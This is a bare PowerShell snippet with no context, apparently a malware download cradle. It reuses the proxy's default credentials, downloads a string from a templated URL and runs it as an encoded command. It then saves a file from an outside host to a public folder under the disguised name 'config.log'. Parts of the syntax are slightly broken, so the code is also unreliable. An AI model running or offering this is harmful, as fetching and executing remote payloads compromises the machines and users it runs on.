(new-object net.webclient).proxy.credentials = [net.credentialcache]::defaultnetworkcredentials; 
$c = (new-object net.webclient).downloadstring({}); 
powershell -enc $c

$f = 'C:\Users\Public\Download\config.log'; 
(new-object web.client).downloadFile('https://fish.rchred.ch/p/3/abc', $f); 
$f


